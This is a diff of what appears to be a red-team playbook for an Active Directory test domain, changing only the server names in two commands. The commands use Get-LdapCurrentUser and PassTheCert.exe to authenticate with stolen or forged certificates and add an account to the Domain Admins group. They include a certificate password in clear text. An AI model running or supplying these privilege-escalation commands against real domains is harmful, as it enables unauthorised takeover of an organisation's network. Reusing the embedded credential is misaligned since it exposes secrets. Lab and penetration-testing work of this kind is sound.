@@ -8,7 +8,7 @@ Use the `Get-LdapCurrentUser` PowerShell script to check the current LDAP user.
 
 - **Command:**
     ```powershell
-    Get-LdapCurrentUser -UseSSL -Server DEG01.test-globalx.com:636 -Certificate C:\Users\admin\Desktop\FourAD\cert.pfx -CertificatePassword sinllaves
+    Get-LdapCurrentUser -UseSSL -Server BIGGRED01.test-globalx.com:636 -Certificate C:\Users\admin\Desktop\FourAD\cert.pfx -CertificatePassword sinllaves
     ```
 
 **Steps:**
@@ -25,7 +25,7 @@ Use the `PassTheCert` tool to add an account to a domain group.
 
 - **Command:**
     ```plaintext
-    .\PassTheCert.exe --server DEGP001.test-globalx.com --cert-path C:\Users\admin\Desktop\FourAD\cert_msada.pfx --cert-password sinllaves --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=test-globalx,DC=com" --account "CN=av1,OU=Users,OU=Tier 2,OU=FI,OU=Territories,DC=test-globalx,DC=com"
+    .\PassTheCert.exe --server BIGGREDP001.test-globalx.com --cert-path C:\Users\admin\Desktop\FourAD\cert_msada.pfx --cert-password sinllaves --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=test-globalx,DC=com" --account "CN=av1,OU=Users,OU=Tier 2,OU=FI,OU=Territories,DC=test-globalx,DC=com"
     ```
 
 **Steps:**
